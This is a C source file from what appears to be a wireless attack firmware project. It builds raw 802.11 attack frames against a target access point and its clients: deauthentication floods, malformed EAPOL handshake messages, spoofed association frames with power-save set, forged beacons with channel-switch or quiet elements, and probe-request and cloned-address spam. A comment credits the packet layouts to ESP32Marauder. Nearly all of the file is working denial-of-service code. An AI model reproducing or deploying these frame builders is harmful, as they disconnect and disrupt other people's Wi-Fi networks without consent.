#include "wifi_ap_job.h"
#include <string.h>
static bool unicast(const uint8_t mac[6])
{return !(mac[0]&1)&&(mac[0]|mac[1]|mac[2]|mac[3]|mac[4]|mac[5]);}
bool cerberus_wifi_ap_channel_valid(uint8_t ch)
{return (ch>=1&&ch<=11)||ch==36||ch==40||ch==44||ch==48||ch==149||ch==153||ch==157||ch==161||ch==165;}
bool cerberus_wifi_ap_needs_station(uint8_t mode)
{return mode==CERBERUS_AP_BAD_MESSAGE||mode==CERBERUS_AP_ASSOC_SLEEP;}
bool cerberus_wifi_ap_job_valid(const cerberus_wifi_ap_job_t *r)
{
    if(!r||!r->job_id||r->mode<CERBERUS_AP_DEAUTH||r->mode>CERBERUS_AP_CLONE_SPAM||r->seconds>20||
       !unicast(r->bssid)||r->scope>CERBERUS_AP_STATION_LIST)return false;
    /* Non-DFS channels available in the existing US scan configuration. */
    if(!cerberus_wifi_ap_channel_valid(r->channel))return false;
    if(r->scope==CERBERUS_AP_ONE_STATION)return (r->mode==CERBERUS_AP_DEAUTH||cerberus_wifi_ap_needs_station(r->mode))&&unicast(r->station)&&memcmp(r->station,r->bssid,6);
    if(r->scope==CERBERUS_AP_STATION_LIST)return (r->mode==CERBERUS_AP_DEAUTH||cerberus_wifi_ap_needs_station(r->mode))&&
        !memcmp(r->station,(uint8_t[6]){0},6);
    if(r->mode==CERBERUS_AP_CLONE_SPAM)return r->scope==CERBERUS_AP_BROADCAST&&
        unicast(r->station)&&(r->station[0]&2)&&memcmp(r->station,r->bssid,6);
    if(cerberus_wifi_ap_needs_station(r->mode))return false;
    const uint8_t zero[6]={0};return !memcmp(r->station,zero,6);
}
bool cerberus_wifi_ap_station_set_valid(const cerberus_wifi_ap_job_t *job,
    const cerberus_wifi_ap_station_set_t *set)
{
    if(!cerberus_wifi_ap_job_valid(job)||job->scope!=CERBERUS_AP_STATION_LIST||!set||
       set->count<2||set->count>CERBERUS_WIFI_STATION_LIMIT)return false;
    for(unsigned i=0;i<set->count;++i){
        if(!unicast(set->mac[i])||!memcmp(set->mac[i],job->bssid,6))return false;
        for(unsigned j=0;j<i;++j)if(!memcmp(set->mac[i],set->mac[j],6))return false;
    }
    return true;
}
size_t cerberus_wifi_ap_frame(const cerberus_wifi_ap_job_t *r,bool from_station,
    uint8_t *out,size_t capacity)
{
    if(!cerberus_wifi_ap_job_valid(r)||r->mode!=CERBERUS_AP_DEAUTH||r->scope==CERBERUS_AP_STATION_LIST||!out||capacity<26||
       (from_station&&r->scope!=CERBERUS_AP_ONE_STATION))return 0;
    memset(out,0,26);out[0]=0xc0;out[24]=7;
    if(from_station){memcpy(out+4,r->bssid,6);memcpy(out+10,r->station,6);}
    else {
        if(r->scope==CERBERUS_AP_BROADCAST)memset(out+4,0xff,6);
        else memcpy(out+4,r->station,6);
        memcpy(out+10,r->bssid,6);
    }
    /* BSSID remains the AP in both directions. The driver assigns sequence. */
    memcpy(out+16,r->bssid,6);return 26;
}
size_t cerberus_wifi_ap_probe(const cerberus_wifi_ap_job_t *r,const uint8_t source[6],
    const uint8_t *ssid,size_t n,uint8_t *out,size_t capacity)
{
    if(!cerberus_wifi_ap_job_valid(r)||r->mode!=CERBERUS_AP_PROBE_REQUEST||!source||
       !unicast(source)||!(source[0]&2)||!memcmp(source,r->bssid,6)||n>32||(!ssid&&n)||!out||capacity<36+n)return 0;
    /* Directed to this AP, including its scanned SSID. A hidden SSID uses a
     * wildcard SSID element while retaining the exact destination/BSSID. */
    memset(out,0,36+n);out[0]=0x40;memcpy(out+4,r->bssid,6);memcpy(out+10,source,6);memcpy(out+16,r->bssid,6);
    out[25]=(uint8_t)n;if(n)memcpy(out+26,ssid,n);
    static const uint8_t rates24[]={0x82,0x84,0x8b,0x96,0x0c,0x18,0x30,0x6c};
    static const uint8_t rates5[]={0x8c,0x12,0x98,0x24,0xb0,0x48,0x60,0x6c};
    out[26+n]=1;out[27+n]=8;memcpy(out+28+n,r->channel<=11?rates24:rates5,8);
    return 36+n;
}

/* Packet layouts derived from ESP32Marauder 511bb3694d0c4dc064888e762bde44fcc9b7f48a.
 * Copyright (c) 2020 Just Call Me Koko. MIT; see LICENSES/ESP32Marauder.txt.
 * Rebuilt into a fresh bounded buffer on every call, without mutable templates. */
size_t cerberus_wifi_ap_bad_message(const cerberus_wifi_ap_job_t *r,bool short_variant,
    uint64_t replay,const uint8_t nonce[32],uint8_t *out,size_t capacity)
{
    size_t n=short_variant?131U:153U;
    if(!cerberus_wifi_ap_job_valid(r)||r->scope!=CERBERUS_AP_ONE_STATION||r->mode!=CERBERUS_AP_BAD_MESSAGE||!nonce||!out||capacity<n)return 0;
    memset(out,0,n);out[0]=8;out[1]=2;
    memcpy(out+4,r->station,6);memcpy(out+10,r->bssid,6);memcpy(out+16,r->bssid,6);
    const uint8_t llc[]={0xaa,0xaa,3,0,0,0,0x88,0x8e};memcpy(out+24,llc,sizeof(llc));
    out[32]=2;out[33]=3;out[35]=short_variant?0x5f:0x75;out[36]=2;
    out[38]=short_variant?0xcb:0xca;out[40]=short_variant?0:16;
    for(unsigned i=0;i<8;++i)out[41+i]=(uint8_t)(replay>>(56-i*8));
    memcpy(out+49,nonce,32);out[130]=22;
    /* Upstream's short variant intentionally retains the absent key-data length. */
    const uint8_t key[]={0xdd,0x14,0,0x0f,0xac,4,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x11};
    if(!short_variant)memcpy(out+131,key,sizeof(key));
    return n;
}
size_t cerberus_wifi_ap_association(const cerberus_wifi_ap_job_t *r,
    const uint8_t *ssid,size_t n,uint8_t *out,size_t capacity)
{
    static const uint8_t tail[]={
        1,4,0x82,4,0x0b,0x16, 0x21,2,1,0x15, 0x24,2,1,0x0d,
        0x30,0x14,1,0,0,0x0f,0xac,4,1,0,0,0x0f,0xac,4,1,0,0,0x0f,0xac,2,0x0c,0,
        0x3b,0x14,0x51,0x86,0x85,0x84,0x83,0x81,0x7f,0x7e,0x7d,0x7c,0x7b,0x7a,0x79,0x78,0x77,0x76,0x75,0x74,0x73,0x51,
        0xdd,0x0a,0,0x10,0x18,2,0,0,0x10,0,0,2};
    size_t length=30+n+sizeof(tail);
    if(!cerberus_wifi_ap_job_valid(r)||r->scope!=CERBERUS_AP_ONE_STATION||r->mode!=CERBERUS_AP_ASSOC_SLEEP||n>32||(!ssid&&n)||!out||capacity<length)return 0;
    memset(out,0,length);out[1]=0x10;out[2]=0x3a;out[3]=1;
    memcpy(out+4,r->bssid,6);memcpy(out+10,r->station,6);memcpy(out+16,r->bssid,6);
    out[24]=0x31;out[26]=10;out[29]=(uint8_t)n;if(n)memcpy(out+30,ssid,n);
    memcpy(out+30+n,tail,sizeof(tail));return length;
}
size_t cerberus_wifi_ap_announcement(const cerberus_wifi_ap_job_t *r,
    const uint8_t *ssid,size_t n,const uint8_t capabilities[2],uint8_t destination,
    uint64_t timestamp,uint8_t *out,size_t capacity)
{
    static const uint8_t quiet[]={7,6,0x55,0x53,0x20,0x64,0x0b,0x14,0x20,1,0,
        5,4,0,1,0,0,0x32,4,0x0c,0x12,0x18,0x60,0x28,6,1,5,0xff,0xff,0,0x64};
    bool csa=r&&r->mode==CERBERUS_AP_CHANNEL_SWITCH;
    size_t length=51+n+(csa?5:sizeof(quiet));
    if(!cerberus_wifi_ap_job_valid(r)||(!csa&&r->mode!=CERBERUS_AP_QUIET)||n>32||(!ssid&&n)||
       !capabilities||!out||capacity<length||(csa&&(!cerberus_wifi_ap_channel_valid(destination)||destination==r->channel)))return 0;
    memset(out,0,length);out[0]=0x80;memset(out+4,255,6);memcpy(out+10,r->bssid,6);memcpy(out+16,r->bssid,6);
    for(unsigned i=0;i<8;++i)out[24+i]=(uint8_t)(timestamp>>(i*8));
    out[32]=100;memcpy(out+34,capabilities,2);out[37]=(uint8_t)n;if(n)memcpy(out+38,ssid,n);
    const uint8_t ies[]={1,8,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,3,1,0};
    memcpy(out+38+n,ies,sizeof(ies));out[50+n]=r->channel;
    if(csa){const uint8_t ie[]={0x25,3,1,destination,255};memcpy(out+51+n,ie,sizeof(ie));}
    else memcpy(out+51+n,quiet,sizeof(quiet));
    return length;
}
bool cerberus_wifi_ap_beacon_capabilities(const cerberus_wifi_ap_job_t *r,
    const uint8_t *ssid,size_t ssid_length,const uint8_t *p,size_t n,uint8_t out[2])
{
    if(!r||!p||!out||ssid_length>32||(!ssid&&ssid_length)||n<38||p[0]!=0x80||
       (p[1]&0x47)||(p[22]&15)||memcmp(p+10,r->bssid,6)||memcmp(p+16,r->bssid,6))return false;
    bool found=false;
    for(size_t i=36;i<n;){
        if(n-i<2||p[i+1]>n-i-2)return false;
        size_t len=p[i+1];
        if(p[i]==0){
            if(found||len>32||(len&&(len!=ssid_length||memcmp(p+i+2,ssid,len))))return false;
            found=true;
        }
        if(p[i]==3&&(len!=1||p[i+2]!=r->channel))return false;
        i+=2+len;
    }
    if(!found)return false;
    memcpy(out,p+34,2);return true;
}
